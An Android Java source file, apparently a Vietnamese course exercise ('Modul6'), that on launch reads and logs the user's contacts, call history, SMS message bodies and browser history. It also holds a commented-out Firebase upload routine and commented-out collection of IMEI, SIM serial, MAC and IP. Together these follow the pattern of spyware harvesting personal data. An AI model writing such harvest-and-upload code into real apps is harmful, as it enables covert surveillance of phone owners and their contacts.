package com.example.Modul6;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;

import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    File file;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // yeu cau quyen
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[] { Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION }, 1);
        }


//        setFileName();

        getContactList();
        getCallDetails();
        getSmsDetails();
//        getDeviceInformation();
        getHistoryWeb();
//        uploadFirebase();

    }

    private void setFileName() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
        String currentTime = sdf.format(new Date());
        String fileName = "contacts"+currentTime+".txt";
        // Define the file name and path
        File downloadsDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        file = new File(downloadsDirectory, fileName);
    }
    private void uploadFirebase() {
//        FirebaseStorage storage = FirebaseStorage.getInstance();
//        // Create a storage reference from our app
//        StorageReference storageRef = storage.getReference();
//        // Create a reference to the file you want to upload
//        StorageReference fileRef = storageRef.child(file.getName());
//
//        String filePath = file.getPath();
//        Uri fileUri = Uri.fromFile(new File(filePath));
//
//
//        // Upload file to Firebase Storage
//        fileRef.putFile(fileUri)
//                .addOnSuccessListener(taskSnapshot -> {
//                    // File uploaded successfully
//                    Log.d("uploadFirebase", "File uploaded successfully");
//                })
//                .addOnFailureListener(e -> {
//                    // Handle unsuccessful uploads
//                    Log.e("uploadFirebase", "Error uploading file", e);
//                });
    }

    private void getContactList() {
        // Query the contacts
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        // Iterate over the cursor to retrieve the contacts
        while (cursor.moveToNext()) {
            // Retrieve the contact name and phone number
            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            // Do something with the contact name and phone number
            Log.d("getContact", "Name: " + name + ", Phone: " + phone);
        }

        // Close the cursor
        cursor.close();
    }
    private void getCallDetails() {
        // Lấy cursor để truy vấn lịch sử cuộc gọi
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");

        // Iterate over the cursor to retrieve the contacts
        while (cursor.moveToNext()) {
            // Lấy thông tin cuộc gọi
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
            String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
            String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));

            // Chuyển đổi định dạng ngày tháng
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
            String dateString = formatter.format(new Date(Long.parseLong(date)));

            // In thông tin cuộc gọi
            Log.d("getmCallDetails", "Name: " + name + " Number: " + number + " Date: " + dateString + " Duration: " + duration + " Type: " + type);

        }
        // Đóng cursor
        cursor.close();

    }
    private void getSmsDetails() {
        // Lấy cursor để truy vấn tin nhắn
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        // Iterate over the cursor to retrieve the contacts
        while (cursor.moveToNext()) {
            // Lấy thông tin tin nhắn
            String address = cursor.getString(cursor.getColumnIndex("address"));
            String body = cursor.getString(cursor.getColumnIndex("body"));
            String date = cursor.getString(cursor.getColumnIndex("date"));

            // Chuyển đổi định dạng ngày tháng
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
            String dateString = formatter.format(new Date(Long.parseLong(date)));

            // In thông tin tin nhắn
            Log.d("getSmsDetails", "Address: " + address + " Date: " + dateString + " Body: " + body);
        }
        // Close the cursor
        cursor.close();
    }

    private void getHistoryWeb() {
        // Lấy cursor để truy vấn lịch sử trình duyệt
        Cursor cursor = getContentResolver().query(Uri.parse("content://browser/history"), null, null, null, null);

        // Iterate over the cursor to retrieve the browsing history
        while (cursor.moveToNext()) {
            // Lấy thông tin trang web
            String title = cursor.getString(cursor.getColumnIndex("title"));
            String url = cursor.getString(cursor.getColumnIndex("url"));
            String date = cursor.getString(cursor.getColumnIndex("date"));

            // Chuyển đổi định dạng ngày tháng
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
            String dateString = formatter.format(new Date(Long.parseLong(date)));

            // In thông tin trang web
            Log.d("getBrowserHistory", "Title: " + title + " URL: " + url + " Date: " + dateString);
        }
        // Đóng cursor
        cursor.close();
    }
    private void getDeviceInformation() {
//        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
//        @SuppressLint("HardwareIds") String imei = telephonyManager.getDeviceId();
//        @SuppressLint("HardwareIds") String simSerial = telephonyManager.getSimSerialNumber();
//
//        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
//        @SuppressLint("HardwareIds") String macAddress = wifiManager.getConnectionInfo().getMacAddress();
//
//        int ipAddress = wifiManager.getConnectionInfo().getIpAddress();
//        String ip = String.format(Locale.getDefault(), "%d.%d.%d.%d",
//                (ipAddress & 0xff), (ipAddress >> 8 & 0xff), (ipAddress >> 16 & 0xff), (ipAddress >> 24 & 0xff));
//
//        String osVersion = Build.VERSION.RELEASE;
//
//        // Log the device information
//        Log.d("DeviceInfo", "IMEI: " + imei + ", SIM Serial: " + simSerial + ", MAC Address: " + macAddress + ", IP Address: " + ip + ", OS Version: " + osVersion);
    }



}